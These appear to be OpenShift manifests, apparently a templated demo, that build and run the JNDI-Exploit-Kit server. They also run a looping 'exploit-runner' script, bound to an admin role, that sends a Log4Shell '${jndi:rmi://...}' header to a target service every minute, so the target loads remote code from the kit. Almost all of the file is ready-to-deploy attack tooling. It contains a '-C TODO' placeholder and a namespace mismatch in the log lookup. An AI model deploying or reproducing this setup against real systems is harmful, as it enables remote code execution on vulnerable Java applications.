apiVersion: image.openshift.io/v1
kind: ImageStream
metadata:
  annotations:
    app.openshift.io/vcs-uri: https://github.com/pimps/JNDI-Exploit-Kit.git
  labels:
    app: jndi-exploit-kit
    app.kubernetes.io/component: jndi-exploit-kit
    app.kubernetes.io/instance: jndi-exploit-kit
    app.kubernetes.io/name: jndi-exploit-kit
    app.kubernetes.io/part-of: jndi-exploit-kit
  name: jndi-exploit-kit
  namespace: jndi-exploit-kit
spec:
  lookupPolicy:
    local: false
---
apiVersion: build.openshift.io/v1
kind: BuildConfig
metadata:
  annotations:
    app.openshift.io/vcs-uri: https://github.com/pimps/JNDI-Exploit-Kit.git
  labels:
    app: jndi-exploit-kit
    app.kubernetes.io/component: jndi-exploit-kit
    app.kubernetes.io/instance: jndi-exploit-kit
    app.kubernetes.io/name: jndi-exploit-kit
    app.kubernetes.io/part-of: jndi-exploit-kit
  name: jndi-exploit-kit
  namespace: jndi-exploit-kit
spec:
  failedBuildsHistoryLimit: 5
  nodeSelector: null
  output:
    to:
      kind: ImageStreamTag
      name: jndi-exploit-kit:latest
  postCommit: {}
  resources: {}
  runPolicy: Serial
  source:
    dockerfile: |-
      FROM docker.io/library/openjdk:11
      RUN curl -Lo /home/jboss/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar https://github.com/pimps/JNDI-Exploit-Kit/raw/master/target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar
      ENTRYPOINT [ "java", "-jar", "/home/jboss/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar" ]
      CMD [ "-C", "TODO", "-J", "jndi-exploit-kit.jndi-exploit-kit.svc:8080", "-L", "jndi-exploit-kit.jndi-exploit-kit.svc:1389", "-R", "jndi-exploit-kit.jndi-exploit-kit.svc:1099" ]
  strategy:
    dockerStrategy:
      from:
        kind: ImageStreamTag
        name: java-runtime:openjdk-11-ubi8
        namespace: openshift
  successfulBuildsHistoryLimit: 5
  triggers:
  - type: ConfigChange
  - imageChange: {}
    type: ImageChange
---
apiVersion: apps/v1
kind: Deployment
metadata:
  annotations:
    alpha.image.policy.openshift.io/resolve-names: '*'
    app.openshift.io/route-disabled: "false"
    image.openshift.io/triggers: '[{"from":{"kind":"ImageStreamTag","name":"jndi-exploit-kit:latest"},"fieldPath":"spec.template.spec.containers[?(@.name==\"jndi-exploit-kit\")].image","pause":"false"}]'
    app.openshift.io/vcs-uri: https://github.com/pimps/JNDI-Exploit-Kit.git
  labels:
    app: jndi-exploit-kit
    app.kubernetes.io/component: jndi-exploit-kit
    app.kubernetes.io/instance: jndi-exploit-kit
  name: jndi-exploit-kit
  namespace: jndi-exploit-kit
spec:
  replicas: 1
  selector:
    matchLabels:
      deployment: jndi-exploit-kit
  template:
    metadata:
      creationTimestamp: null
      labels:
        deployment: jndi-exploit-kit
    spec:
      containers:
      - image: jndi-exploit-kit:latest
        imagePullPolicy: Always
        name: jndi-exploit-kit
        resources: {}
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
      dnsPolicy: ClusterFirst
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      terminationGracePeriodSeconds: 30
---
apiVersion: v1
kind: Service
metadata:
  labels:
    app: jndi-exploit-kit
  name: jndi-exploit-kit
  namespace: jndi-exploit-kit
spec:
  ports:
  - name: http
    port: 8080
    protocol: TCP
    targetPort: 8080
  - name: ldap
    port: 1389
    protocol: TCP
    targetPort: 1389
  - name: rmi
    port: 1099
    protocol: TCP
    targetPort: 1099
  selector:
    deployment: jndi-exploit-kit
  sessionAffinity: None
  type: ClusterIP
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: exploit-runner
  namespace: jndi-exploit-kit
data:
  exploit.sh: |
    #!/bin/bash

    set -Eeuo pipefail
    
    TARGET="https://information-service.{{ .Values.openshiftDnsZone }}/"
    echo "Target is at '$TARGET'"
    EXPLOIT_URL="$(oc logs -n exploitkit-log4j deploy/jndi-exploit-kit | grep -A1 "BYPASS WITH EL by @welk1n" | grep rmi:// | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g')"
    echo "Exploit is at '$EXPLOIT_URL'"

    while true; do
      curl -k "$TARGET" -H "X-Name: \${jndi:$EXPLOIT_URL}"
      sleep 60
    done

    exit 0
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: exploit-runner
  namespace: jndi-exploit-kit
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: exploit-runner
  namespace: jndi-exploit-kit
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: admin
subjects:
- kind: ServiceAccount
  name: exploit-runner
  namespace: jndi-exploit-kit
---
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: exploit-runner
    app.kubernetes.io/component: exploit-runner
    app.kubernetes.io/instance: exploit-runner
  name: exploit-runner
  namespace: jndi-exploit-kit
spec:
  replicas: 1
  selector:
    matchLabels:
      deployment: exploit-runner
  template:
    metadata:
      creationTimestamp: null
      labels:
        deployment: exploit-runner
    spec:
      containers:
      - image: image-registry.openshift-image-registry.svc.cluster.local:5000/openshift/cli-artifacts:latest
        imagePullPolicy: Always
        command:
        - /entrypoint/exploit.sh
        args: []
        name: exploit-runner
        resources: {}
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /entrypoint
          name: entrypoint
          readOnly: true
      dnsPolicy: ClusterFirst
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      terminationGracePeriodSeconds: 30
      volumes:
      - name: entrypoint
        configMap:
          name: exploit-runner
          defaultMode: 0755
      serviceAccountName: exploit-runner
      serviceAccount: exploit-runner
